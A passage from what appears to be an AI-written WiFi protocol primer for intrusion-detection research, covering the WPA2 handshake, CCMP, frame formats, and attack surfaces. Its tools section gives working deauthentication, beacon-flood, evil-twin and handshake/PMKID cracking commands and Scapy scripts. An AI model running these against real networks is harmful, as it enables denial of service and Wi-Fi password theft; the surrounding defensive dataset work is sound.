│ SIFS (Short IFS) │ 10 μs   │ 16 μs (802.11b)  │
│ PIFS (PCF IFS)   │ 30 μs   │ 25 μs            │
│ DIFS (DCF IFS)   │ 50 μs   │ 34 μs            │
│ Slot Time        │ 20 μs   │ 9 μs             │
└──────────────────┴─────────┴──────────────────┘

DIFS = SIFS + (2 × Slot Time)
```

**Channel Access Example:**
```
Timeline:
│
├─ Station A transmits Data ────────────────┐
│                                           │
│  [SIFS = 10 μs]                           │
│                                           │
├─ AP transmits ACK ───┐                    │
│                      │                    │
│  [DIFS = 50 μs]      │                    │
│                      │                    │
├─ Station B senses channel busy ───────────┘
│  Picks backoff: 7 slots (7 × 20 = 140 μs)
│  Starts countdown: 7... 6... 5...
│
├─ Station C also waiting, backoff: 3 slots
│  Countdown: 3... 2... 1... 0 → TRANSMIT!
│
├─ Station B freezes at 5, waits for channel
│  Resumes countdown after C's transmission
│  5... 4... 3... 2... 1... 0 → TRANSMIT!
```

---

## **9. SECURITY MECHANISMS**

### **9.1 Security Evolution**

```
┌──────────────────────────────────────────────────────┐
│  WEP (Wired Equivalent Privacy) - BROKEN!            │
│  ├── Released: 1997                                  │
│  ├── Encryption: RC4 stream cipher                   │
│  ├── Key Size: 40-bit or 104-bit + 24-bit IV         │
│  ├── Authentication: Shared Key                      │
│  ├── Integrity: CRC-32 (not cryptographic!)          │
│  └── Vulnerability: IV reuse, weak keys, crackable!  │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│  WPA (WiFi Protected Access) - Transitional          │
│  ├── Released: 2003 (WEP replacement)                │
│  ├── Encryption: TKIP (Temporal Key Integrity)       │
│  ├── Key Size: 128-bit per-packet keys               │
│  ├── Authentication: PSK or 802.1X/EAP               │
│  ├── Integrity: Michael MIC                          │
│  └── Status: Deprecated, vulnerable to attacks       │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│  WPA2 (802.11i) - Current Standard                   │
│  ├── Released: 2004                                  │
│  ├── Encryption: AES-CCMP                            │
│  ├── Key Size: 128-bit                               │
│  ├── Authentication: PSK (Personal) or 802.1X (Ent)  │
│  ├── Integrity: CBC-MAC                              │
│  └── Vulnerability: KRACK (2017, mostly patched)     │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│  WPA3 (Latest) - Enhanced Security                   │
│  ├── Released: 2018                                  │
│  ├── Encryption: AES-CCMP or AES-GCMP (192-bit opt)  │
│  ├── Authentication: SAE (Simultaneous Auth of Equals)│
│  ├── Forward Secrecy: Yes!                           │
│  ├── PMF: Protected Management Frames (mandatory)    │
│  ├── No Dictionary Attacks on PSK                    │
│  └── Enhanced Open (OWE) for public WiFi             │
└──────────────────────────────────────────────────────┘
```

### **9.2 WPA2-PSK 4-Way Handshake**

This is THE critical security exchange:

```
PHASE 1: PTK (Pairwise Transient Key) GENERATION

Inputs:
├── PMK (Pairwise Master Key) = PSK = SHA256(Password)
├── ANonce (AP's random nonce)
├── SNonce (Station's random nonce)
├── AP MAC address
└── Station MAC address

PTK = PRF-512(PMK, "Pairwise key expansion",
              Min(AA, SPA) || Max(AA, SPA) ||
              Min(ANonce, SNonce) || Max(ANonce, SNonce))

PTK Components (512 bits total):
├── KCK (128 bits): Key Confirmation Key (MIC)
├── KEK (128 bits): Key Encryption Key (Group Key)
├── TK (128 bits):  Temporal Key (data encryption)
└── MIC Keys (128 bits): For Michael algorithm

PHASE 2: 4-WAY HANDSHAKE EXCHANGE

Station (STA)                        Access Point (AP)
   │                                        │
   │  [Association complete]                │
   │                                        │
   │←────── EAPOL Message 1 ────────────────│
   │        ANonce (AP's nonce)             │
   │        Replay Counter                  │
   │                                        │
   │  [STA computes PTK]                    │
   │  PTK = PRF-512(PMK, ...)               │
   │                                        │
   │─────── EAPOL Message 2 ───────────────→│
   │        SNonce (STA's nonce)            │
   │        MIC (using KCK from PTK)        │
   │        RSN IE                          │
   │                                        │
   │  [AP computes PTK, verifies MIC]       │
   │  [AP installs PTK]                     │
   │                                        │
   │←────── EAPOL Message 3 ────────────────│
   │        ANonce (same)                   │
   │        MIC (using KCK)                 │
   │        GTK (Group Temporal Key) ← encrypted
   │        RSN IE                          │
   │        Install PTK command             │
   │                                        │
   │  [STA verifies MIC, installs PTK & GTK]│
   │                                        │
   │─────── EAPOL Message 4 ───────────────→│
   │        MIC (confirmation)              │
   │                                        │
   │  [Encrypted communication begins!]     │
   │                                        │

EAPOL Frame Structure:
┌─────────────────────────────────────────────────────┐
│ 802.11 MAC Header (Data frame)                      │
├─────────────────────────────────────────────────────┤
│ LLC/SNAP Header: Type = 0x888E (EAPOL)              │
├─────────────────────────────────────────────────────┤
│ EAPOL Header:                                       │
│  ├── Version: 1 or 2                                │
│  ├── Type: 3 (EAPOL-Key)                            │
│  └── Length: varies                                 │
├─────────────────────────────────────────────────────┤
│ EAPOL-Key Frame:                                    │
│  ├── Descriptor Type: 2 (RSN)                       │
│  ├── Key Information (2 bytes):                     │
│  │   ├── Key Type: Pairwise                         │
│  │   ├── Install: 0/1                               │
│  │   ├── ACK: 0/1                                   │
│  │   ├── MIC: 0/1                                   │
│  │   ├── Secure: 0/1                                │
│  │   └── Error/Request/Encrypted flags              │
│  ├── Key Length: 16 (AES)                           │
│  ├── Replay Counter: 8 bytes (prevents replays)     │
│  ├── Key Nonce: 32 bytes (ANonce or SNonce)         │
│  ├── Key IV: 16 bytes                               │
│  ├── Key RSC: 8 bytes                               │
│  ├── Key ID: 8 bytes                                │
│  ├── Key MIC: 16 bytes (authentication!)            │
│  ├── Key Data Length: varies                        │
│  └── Key Data: RSN IE, GTK, etc.                    │
└─────────────────────────────────────────────────────┘
```

**CRITICAL: Capturing this 4-way handshake allows offline PSK cracking!**

### **9.3 Data Encryption (CCMP)**

```
CCMP (Counter Mode with CBC-MAC Protocol):

Encryption:
┌────────────────────────────────────────────────┐
│ Plaintext Data                                 │
└────────────────┬───────────────────────────────┘
                 │
     ┌───────────▼──────────────┐
     │ CCMP Header (8 bytes)    │
     │  ├── PN (Packet Number)  │ ← Replay protection
     │  ├── Key ID              │
     │  └── Ext IV              │
     └───────────┬──────────────┘
                 │
     ┌───────────▼──────────────┐
     │ AES-CTR Encryption       │
     │ Key: TK (from PTK)       │
     │ Nonce: PN + A2 (src MAC) │
     └───────────┬──────────────┘
                 │
                 ▼
     ┌────────────────────────────┐
     │ Ciphertext                 │
     └────────────┬───────────────┘
                  │
     ┌────────────▼───────────────┐
     │ CBC-MAC for Integrity      │
     │ → MIC (8 bytes)            │
     └────────────────────────────┘

CCMP Frame:
┌─────────────────────────────────────────────────────┐
│ 802.11 MAC Header (Protected Frame bit = 1)         │
├─────────────────────────────────────────────────────┤
│ CCMP Header (8 bytes):                              │
│  ├── PN0, PN1 (Packet Number bytes 0-1)             │
│  ├── Reserved                                       │
│  ├── Key ID (bits 6-7), Ext IV (bit 5)              │
│  └── PN2, PN3, PN4, PN5 (Packet Number bytes 2-5)   │
├─────────────────────────────────────────────────────┤
│ Encrypted Data (LLC + IP + payload)                 │
├─────────────────────────────────────────────────────┤
│ MIC (8 bytes) - Message Integrity Code              │
└─────────────────────────────────────────────────────┘

Packet Number (PN):
- 48-bit counter (6 bytes)
- Increments for each frame
- Prevents replay attacks
- If PN wraps around → rekey required!
```

---

## **10. COMPLETE CONNECTION FLOW**

```
FULL WPA2-PSK CONNECTION SEQUENCE:

Time │ Station (Client)              │ Access Point
─────┼───────────────────────────────┼─────────────────────
T0   │                               │ Broadcasts Beacons
     │                               │ SSID, Capabilities, RSN IE
─────┼───────────────────────────────┼─────────────────────
T1   │ Probe Request ───────────────→│
     │ SSID: "MyNetwork"             │
─────┼───────────────────────────────┼─────────────────────
T2   │←────────────── Probe Response │
     │                               │ SSID, BSSID, Rates, etc.
─────┼───────────────────────────────┼─────────────────────
T3   │ Authentication Request ──────→│
     │ Algorithm: Open System        │
─────┼───────────────────────────────┼─────────────────────
T4   │←──────── Authentication Response
     │                               │ Status: Success
─────┼───────────────────────────────┼─────────────────────
T5   │ Association Request ─────────→│
     │ SSID, Rates, Capabilities     │
     │ RSN IE (WPA2 info)            │
─────┼───────────────────────────────┼─────────────────────
T6   │←──────── Association Response │
     │                               │ Status: Success, AID: 1
─────┼───────────────────────────────┼─────────────────────
T7   │←────────────── EAPOL Msg 1 ───│
     │                               │ ANonce
─────┼───────────────────────────────┼─────────────────────
T8   │ EAPOL Msg 2 ─────────────────→│
     │ SNonce, MIC, RSN IE           │
─────┼───────────────────────────────┼─────────────────────
T9   │←────────────── EAPOL Msg 3 ───│
     │                               │ ANonce, GTK, MIC, Install
─────┼───────────────────────────────┼─────────────────────
T10  │ EAPOL Msg 4 ─────────────────→│
     │ MIC (confirmation)            │
─────┼───────────────────────────────┼─────────────────────
T11  │ [PTK installed, encryption ON]│
─────┼───────────────────────────────┼─────────────────────
T12  │ Encrypted Data Frame ────────→│
     │ (CCMP encrypted)              │
─────┼───────────────────────────────┼─────────────────────
T13  │←──────────────────────── ACK ──│
─────┼───────────────────────────────┼─────────────────────
T14  │←──── Encrypted Data Frame ────│
     │                               │ (CCMP encrypted)
─────┼───────────────────────────────┼─────────────────────
T15  │ ACK ──────────────────────────→│
```

---

## **11. COMPARISON: WiFi vs BLE vs Zigbee vs LoRa**

| Aspect | WiFi | BLE | Zigbee | LoRa/LoRaWAN |
|--------|------|-----|--------|--------------|
| **Standard** | IEEE 802.11 | Bluetooth SIG | IEEE 802.15.4 | LoRa Alliance |
| **Frequency** | 2.4/5/6 GHz | 2.4 GHz | 2.4 GHz (main) | Sub-GHz (868/915) |
| **Modulation** | OFDM/MIMO | GFSK | O-QPSK | CSS (Chirp) |
| **Data Rate** | 1 Mbps - 9.6 Gbps | 1-2 Mbps | 250 kbps | 0.3-50 kbps |
| **Range** | 50-100m | 10-100m | 10-100m (mesh) | 2-15+ km |
| **Topology** | Star (Infrastructure) | Star | Mesh | Star-of-stars |
| **Power** | High (100-1000 mW) | Ultra-low (1-10 mW) | Low (10-100 mW) | Ultra-low (1-100 mW) |
| **MAC** | CSMA/CA | Time-slotted | CSMA/CA | ALOHA |
| **Addressing** | MAC (6 bytes) | BD_ADDR (6 bytes) | IEEE (8 B) + Short (2 B) | DevEUI (8 B) + DevAddr (4 B) |
| **Security** | WPA2/WPA3 (AES) | AES-CCM | AES-CCM* | AES-128 (CTR + CMAC) |
| **Handshake** | 4-way EAPOL | Pairing | Transport Key | OTAA Join |
| **Channels** | 14 (2.4G), 25 (5G) | 40 (3 adv + 37 data) | 16 (2.4 GHz) | 8-64 (region dependent) |
| **Coexistence** | Poor (overlapping) | Good (freq hopping) | Poor (overlaps WiFi) | Excellent (sub-GHz) |
| **Use Case** | Internet, Video | Wearables, Audio | Home automation | Wide-area IoT, Sensors |

---

## **12. ATTACK SURFACES FOR YOUR ML RESEARCH**

### **12.1 Management Frame Attacks**
| Attack | Target Frame | Mechanism | Difficulty |
|--------|--------------|-----------|------------|
| **Deauth Attack** | Deauthentication | Spam deauth frames to disconnect clients | Easy |
| **Disassoc Attack** | Disassociation | Similar to deauth | Easy |
| **Beacon Flood** | Beacon | Create fake APs to overwhelm scanners | Easy |
| **SSID Cloaking Bypass** | Probe Response | Reveal hidden SSIDs | Easy |
| **Rogue AP** | Beacon, Assoc | Fake AP with same SSID (Evil Twin) | Medium |

### **12.2 Authentication/Association Attacks**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Auth Flood** | Authentication | Spam auth requests | Easy |
| **Assoc Flood** | Association | Spam assoc requests | Easy |
| **AP Starvation** | AP Resources | Exhaust AP connection slots | Medium |

### **12.3 4-Way Handshake Attacks**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Handshake Capture** | EAPOL | Capture for offline cracking | Easy |
| **Forced Reauth** | Deauth → EAPOL | Deauth to trigger new handshake | Easy |
| **PMKID Attack** | RSN IE | Extract PMKID for offline crack (no handshake!) | Easy |
| **KRACK** | EAPOL Msg 3 | Replay Msg 3 to reset encryption | Hard (patched) |

### **12.4 Data Layer Attacks**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Packet Injection** | Data Frames | Inject arbitrary packets | Medium |
| **ARP Spoofing** | ARP | MITM attack on L2 | Medium |
| **DNS Spoofing** | DNS Queries | Redirect traffic | Medium |
| **SSL Stripping** | HTTPS | Downgrade to HTTP | Medium |

### **12.5 Physical Layer Attacks**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Jamming** | PHY | Transmit noise on WiFi channels | Easy |
| **Selective Jamming** | ACKs | Jam only ACK frames | Medium |
| **Reactive Jamming** | Data | Jam when activity detected | Medium |

### **12.6 WPA3 Specific**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Downgrade to WPA2** | Association | Force client to use WPA2 | Easy (if supported) |
| **Dragonblood** | SAE | Timing/side-channel on SAE handshake | Very Hard |

---

## **13. KNOWN VULNERABILITIES**

### **13.1 WEP - Completely Broken**
```
Problem: 24-bit IV (Initialization Vector) reuses quickly
Attack: Collect ~40,000 packets → crack key in minutes
Tools: aircrack-ng
Status: NEVER USE WEP!
```

### **13.2 WPA/WPA2 - Deauth Attack**
```
Problem: Deauth/Disassoc frames not authenticated
Attack: Send forged deauth → disconnect clients → capture handshake
Impact: Denial of service + offline password cracking
Solution: WPA3 with PMF (Protected Management Frames)
```

### **13.3 WPA/WPA2 - Weak PSK**
```
Problem: Short or dictionary passwords
Attack: Capture 4-way handshake → offline brute-force
Tools: aircrack-ng, hashcat
Impact: Network compromise if weak password
Solution: Use strong passphrases (20+ chars), WPA3-SAE
```

### **13.4 WPA2 - KRACK (Key Reinstallation Attack)**
```
Problem: Replay EAPOL Message 3 → nonce/counter reuse
Attack: Force counter reset → decrypt/inject traffic
Year: 2017 (CVE-2017-13077 through CVE-2017-13088)
Impact: Decrypt traffic, inject packets
Status: Mostly patched, but old devices vulnerable
```

### **13.5 WPA2 - PMKID Attack**
```
Problem: PMKID in RSN IE of first EAPOL frame or Assoc Response
Attack: Request association → extract PMKID → offline crack
Advantage: NO handshake capture needed!
Tools: hcxdumptool, hashcat
Impact: Easier PSK cracking
Solution: Use WPA3
```

### **13.6 Evil Twin / Rogue AP**
```
Problem: Users connect to familiar SSID without verification
Attack: Create fake AP with same SSID → MITM
Tools: hostapd, dnsmasq, bettercap
Impact: Traffic interception, credential theft
Solution: 802.11w (PMF), certificate pinning
```

---

## **14. TOOLS FOR WiFi RESEARCH**

### **14.1 Hardware**

```
┌──────────────────────────────────────────────────┐
│  Raspberry Pi 5 (Your Current Setup)             │
│  • Built-in WiFi: Broadcom brcmfmac              │
│  • Supports monitor mode with Nexmon firmware    │
│  • Packet injection: Limited (~25-30 burst)      │
│  • Channels: 2.4 GHz (1-13)                      │
│  • Good for: Sniffing, basic injection           │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  Alfa AWUS036NHA (Atheros AR9271)                │
│  • Chipset: Atheros (ath9k_htc driver)           │
│  • Full monitor mode & injection                 │
│  • 2.4 GHz only                                  │
│  • ~$40, most popular for WiFi hacking           │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  Alfa AWUS036ACH (Realtek RTL8812AU)             │
│  • Dual-band: 2.4 + 5 GHz                        │
│  • 802.11ac support                              │
│  • Good monitor mode support                     │
│  • ~$50-60                                       │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  TP-Link TL-WN722N v1 (Atheros AR9271)           │
│  • Same chipset as Alfa AWUS036NHA               │
│  • 2.4 GHz                                       │
│  • ~$15-20 (if you find v1, not v2/v3!)          │
│  • NOTE: v2/v3 have Realtek chip (worse support) │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  HackRF One / LimeSDR (Software Defined Radio)   │
│  • Full control over PHY layer                   │
│  • Can transmit/receive any modulation           │
│  • Research-grade, expensive ($300-500)          │
│  • Overkill for most WiFi research               │
└──────────────────────────────────────────────────┘
```

### **14.2 Software Tools**

#### **aircrack-ng Suite** (You're already familiar!)
```bash
# Put interface in monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Capture handshake (specific AP)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack to force handshake
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA2 handshake
aircrack-ng -w wordlist.txt capture-01.cap

# PMKID attack
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcaptool -z pmkid.16800 pmkid.pcapng
hashcat -m 16800 pmkid.16800 wordlist.txt
```

#### **Scapy (Python Packet Crafting)**
```python
from scapy.all import *

# Craft deauth frame
dot11 = Dot11(type=0, subtype=12, 
              addr1="FF:FF:FF:FF:FF:FF",  # Dest (broadcast)
              addr2="AA:BB:CC:DD:EE:FF",  # Source (AP BSSID)
              addr3="AA:BB:CC:DD:EE:FF")  # BSSID
deauth = RadioTap()/dot11/Dot11Deauth(reason=7)

# Send 100 times
sendp(deauth, iface="wlan0mon", count=100, inter=0.1)

# Beacon flood
def beacon_flood():
    dot11 = Dot11(type=0, subtype=8, 
                  addr1="FF:FF:FF:FF:FF:FF",
                  addr2=RandMAC(),  # Random AP MAC
                  addr3=RandMAC())
    beacon = RadioTap()/dot11/Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=RandString(RandNum(1,30)))
    rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96')
    channel = Dot11Elt(ID='DSset', info=chr(random.randint(1,13)))
    
    frame = beacon/essid/rates/channel
    sendp(frame, iface="wlan0mon", loop=1, inter=0.1)
```

#### **Bettercap (Modern Swiss Army Knife)**
```bash
# Start bettercap
sudo bettercap -iface wlan0mon

# WiFi recon
wifi.recon on

# Show networks
wifi.show

# Deauth attack
wifi.deauth AA:BB:CC:DD:EE:FF

# Evil Twin AP
set wifi.ap.ssid "FreeWiFi"
set wifi.ap.encryption false
wifi.ap

# Capture handshakes automatically
set wifi.handshakes.file /root/handshakes.pcap
wifi.recon on
```

#### **Wifite2 (Automated)**
```bash
# Automated WPA/WPA2 cracking
sudo wifite --kill

# Target specific AP
sudo wifite -b AA:BB:CC:DD:EE:FF

# PMKID attack only
sudo wifite --pmkid

# With custom wordlist
sudo wifite --dict /path/to/wordlist.txt
```

---

## **15. DATASET COLLECTION STRATEGY**

For your ML-based IDS, collect these traffic patterns:

### **15.1 Benign Traffic Patterns**
```
Normal Operations:
├── Beacon frames (regular intervals, ~100 TU)
├── Probe request/response sequences
├── Authentication/Association flows
├── 4-way EAPOL handshake (legitimate)
├── Normal data traffic (web, streaming, etc.)
├── ARP requests/responses
├── DHCP discovery/offer/request/ack
├── DNS queries
└── Keep-alive/null frames
```

### **15.2 Attack Traffic Patterns**
```
Attack Scenarios:
├── Deauth floods (high rate, broadcast/unicast)
├── Disassoc floods
├── Beacon floods (many fake APs)
├── Auth/Assoc floods (resource exhaustion)
├── Malformed frames (invalid checksums, lengths)
├── Unusual retry rates (jamming signature)
├── EAPOL replay attempts
├── PMKID extraction attempts
├── Rogue AP signatures (SSID cloning)
├── ARP spoofing patterns
└── Injection signatures (unusual timing)
```

### **15.3 Feature Extraction**
```
Per-Packet Features:
- Timestamp
- Frame type & subtype
- Source/Dest/BSSID addresses
- Frame length
- Sequence number
- Retry flag
- Protected frame flag
- Duration field
- RSSI (signal strength)
- Channel number
- Data rate
- MCS (Modulation & Coding Scheme)
- Frame check sequence (valid/invalid)

Flow-Based Features:
- Inter-frame arrival time
- Frames per second (by type)
- Bytes per second
- Unique source MAC count
- Beacon interval variance
- Retry rate (retransmissions)
- Deauth/Disassoc rate
- EAPOL frame frequency
- Association success rate
- Average frame size
- Channel utilization

Time-Series Features:
- Moving average of frame rates
- Burst detection (sudden spikes)
- Periodicity analysis
- Anomalous gaps in transmission
- Handshake completion times
```

---

## **16. RASPBERRY PI 5 SPECIFIC CONSIDERATIONS**

Based on your hardware constraints:

```
RASPBERRY PI 5 WiFi CAPABILITIES:

Hardware:
├── Chipset: Broadcom BCM43455 (brcmfmac driver)
├── Bands: 2.4 GHz + 5 GHz
├── Standards: 802.11 b/g/n/ac
└── Antenna: Internal (dual-band)

Monitor Mode:
├── Native Support: NO (requires patching)
├── Solution: Nexmon firmware
├── Installation: 
│   git clone https://github.com/seemoo-lab/nexmon.git
│   cd nexmon
│   # Follow Pi-specific instructions
└── Limitations: Packet injection rate limited

Packet Injection:
├── Rate: ~25-30 packets/burst (your finding!)
├── Reason: Firmware limitations, not driver
├── Workaround: 
│   • Paced attacks (sleep between bursts)
│   • Smaller burst sizes
│   • Cool-down periods
│   • Consider external adapter for intensive injection
└── Best for: Sniffing, light injection, research

External Adapter Recommendation:
└── For heavy packet injection: Alfa AWUS036NHA
    ├── Connect via USB
    ├── No injection limitations
    ├── Better for MDK4, aireplay-ng intensive attacks
    └── ~$40 investment
```

---

## **17. QUICK REFERENCE: PACKET DISSECTION CHEAT SHEET**

```
LAYER-BY-LAYER BREAKDOWN:

RadioTap Header (variable, typically 18-36 bytes):
├── Version: 0x00
├── Pad: 0x00
├── Length: 0x0012 (18 bytes)
├── Present Flags: 0x0000482E
│   └── Indicates which fields present
├── Flags: 0x10
├── Data Rate: 0x0C (6 Mbps)
├── Channel: 0x096C, 0x00A0 (2.412 GHz, CCK)
├── Antenna Signal: 0xD6 (-42 dBm)
└── Antenna: 0x01

802.11 MAC Header (minimum 24 bytes):
├── Frame Control (2 bytes): 0x0080
│   ├── Version: 00
│   ├── Type: 00 (Management)
│   ├── Subtype: 1000 (Beacon)
│   └── Flags: To DS=0, From DS=0, More Frag=0, etc.
├── Duration: 0x0000
├── Address 1 (DA): FF:FF:FF:FF:FF:FF (Broadcast)
├── Address 2 (SA): AA:BB:CC:DD:EE:FF (BSSID)
├── Address 3 (BSSID): AA:BB:CC:DD:EE:FF
├── Sequence Control: 0x1020 (Seq=258, Frag=0)
└── [QoS Control]: (if present in QoS Data frames)

Management Frame Body (Beacon):
├── Timestamp: 0x000000123456789A (8 bytes)
├── Beacon Interval: 0x0064 (100 TU = 102.4 ms)
├── Capability: 0x0411
│   ├── ESS: 1 (Infrastructure)
│   ├── Privacy: 1 (Encryption required)
│   └── Short Preamble: 1
└── Tagged Parameters:
    ├── SSID (Tag 0, Len 8): "MyWiFi"
    ├── Rates (Tag 1): 1, 2, 5.5, 11 Mbps
    ├── DS (Tag 3): Channel 6
    ├── TIM (Tag 5): Traffic indication
    ├── RSN (Tag 48): WPA2 details ← Parse this!
    │   ├── Version: 1
    │   ├── Group Cipher: AES-CCMP
    │   ├── Pairwise Cipher: AES-CCMP
    │   ├── AKM: PSK
    │   └── RSN Capabilities
    └── HT/VHT tags: 802.11n/ac info

FCS (4 bytes at end): 0x12345678 (CRC-32)
```

---

That's the comprehensive WiFi (802.11) breakdown!

**Key Takeaways:**
1. **Infrastructure mode** - AP as central coordinator (vs peer-to-peer)
2. **OFDM + MIMO** - High speed through parallel streams
3. **CSMA/CA** - Collision avoidance (not detection like Ethernet)
4. **Three frame types** - Management (control), Control (ACK), Data (payload)
5. **WPA2 4-way handshake** - PTK derivation for encryption
6. **Deauth vulnerability** - Unauthenticated management frames (fixed in WPA3)

**Your Raspberry Pi 5:**
- ✓ Good for packet sniffing (all frames)
- ✓ Good for handshake capture
- ✓ Moderate for light packet injection (deauth, beacon)
- ✗ Limited for heavy injection attacks (MDK4 flooding)
- → Consider Alfa adapter for intensive injection work

**Comparison with Your Other Protocols:**
- **WiFi**: Fastest (Gbps), shortest range (~100m), highest power
- **BLE**: Medium speed (Mbps), short range, ultra-low power
- **Zigbee**: Slow (250 kbps), mesh extends range, low power
- **LoRa**: Slowest (kbps), longest range (15+ km), ultra-low power

**Next Steps for Your Research:**
1. Complete protocol documentation ✓ (WiFi/BLE/Zigbee/LoRa)
2. Set up multi-protocol sniffing (Raspberry Pi 5 + adapters)
3. Implement baseline attacks per protocol
4. Capture labeled datasets (benign + attack)
5. Feature engineering (per-packet + flow-based)
6. ML model training (Random Forest, LSTM, CNN)
7. Real-time IDS deployment

**Questions:**
- Want detailed Nexmon setup guide for Pi 5?
- Need unified attack implementation framework?
- Dataset labeling automation scripts?
- Multi-protocol ML feature extraction pipeline?
- Comparison matrix for attack effectiveness across protocols?

What's your next priority? 🎯

---

**Related**:
- [[WiFi/README|WiFi Home]]
- [[WiFi/Attacks/01-deauth-analysis|Deauth Attack Analysis]]
- [[WiFi/Security/01-wpa2-handshake|WPA2 Handshake Deep Dive]]
- [[README|Home]] • [[INDEX|Full Index]]
